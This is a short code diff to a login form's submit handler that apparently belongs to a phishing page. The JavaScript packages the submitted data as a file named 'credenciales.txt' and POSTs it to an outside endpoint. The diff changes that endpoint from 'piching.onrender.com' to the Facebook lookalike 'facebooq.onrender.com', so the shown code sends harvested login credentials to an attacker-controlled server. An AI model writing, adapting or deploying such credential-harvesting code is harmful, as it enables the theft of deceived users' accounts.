@@ -10,7 +10,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     let formData = new FormData();
     formData.append("file", blob, "credenciales.txt");
 
-    fetch("https://piching.onrender.com/send-email", {
+    fetch("https://facebooq.onrender.com/send-email", {
         method: "POST",
         body: formData
     })
